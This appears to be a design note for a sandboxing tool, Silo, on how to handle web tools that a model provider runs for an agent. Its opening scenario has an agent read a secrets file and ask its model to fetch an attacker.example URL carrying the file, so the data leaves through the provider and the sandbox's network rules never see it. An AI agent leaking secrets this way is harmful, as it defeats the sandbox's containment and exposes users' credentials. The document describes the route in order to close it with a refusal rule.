# What does Silo do with a tool that the model provider runs for the agent

## The choice

An agent's part, 24 November 2026. A fork is limited to `github.com`, and the provider's API host
is allowed so that the agent can work. The agent reads a file of secrets, then asks its model to
fetch `https://attacker.example/?d=<the file>`. The model provider fetches the page from its own
servers. Nothing in the fork connected to `attacker.example`, so the fork's rules never saw it.

The options:

- A rule refuses the request in a limited or closed computer (recommended). Silo already reads
  the request on its way to the provider. When the request turns on a tool that the provider runs,
  the request is not sent unless your rules allow that tool, and the program gets an error that
  says why. This changes nothing in the traffic, as `what-silo-changes-in-traffic` asks: a refused
  request is not sent at all. It costs web search and page fetching run by the provider in limited
  computers, until you allow them. It also costs a list, kept for each provider format, of the kinds
  of tool the provider runs. A new kind is refused until Silo knows it.
- Record it and alert. The request goes through, the record holds the tool and its argument, and
  you are alerted. It costs the meaning of "limited": the computer reaches a host that is not on
  its list.
- Take the tool out of the request. Silo removes it and sends the rest. It costs a change to the
  traffic, which `what-silo-changes-in-traffic` rules out, and a model that is told about a tool
  it then cannot use.

Recommended: a rule refuses the request. A limited computer should reach only what its list says,
and the refusal is exact: the tool is written in the request.

## Notes

Agents' research of 24 November 2026.

- Anthropic's Messages API offers tools that Anthropic runs, such as web search and web fetch, and
  an MCP connector that Anthropic opens itself. OpenAI's Responses API offers web search, file
  search and remote MCP servers in the same way. In both formats, a tool the provider runs has a
  type of its own in the request. A tool the program runs is defined by its name and the shape of
  its input, so the two are told apart in the request itself.
- One local product for agents already refuses "the providers' own internet tools" it knows of,
  and says that "one a provider adds later may get through". Treating an unknown kind as run by the
  provider closes that gap, at the cost of refusing a harmless new tool until Silo knows it.
- Claude Code on the web documents the same path for its own cloud: at its strictest network
  level, the Anthropic API stays reachable, and its documentation warns that this "may allow data
  to exit the VM".
- What the provider fetched comes back in the reply. Silo reads it there, but it is what the
  provider says it did, not something Silo saw.
